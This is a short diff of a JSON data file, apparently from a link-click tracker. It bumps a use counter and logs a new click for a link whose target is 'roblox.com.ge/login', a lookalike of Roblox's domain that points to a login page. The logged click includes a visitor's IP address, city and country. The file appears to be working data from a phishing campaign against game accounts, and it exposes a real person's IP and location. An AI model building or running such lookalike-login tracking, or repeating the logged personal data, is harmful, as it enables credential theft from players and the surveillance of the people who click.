@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1395,
+    "useCount": 1396,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11328,6 +11328,14 @@
         "city": "Lahug",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777425864194,
+        "ip": "177.74.236.124",
+        "country": "Brazil",
+        "city": "Diamantina",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
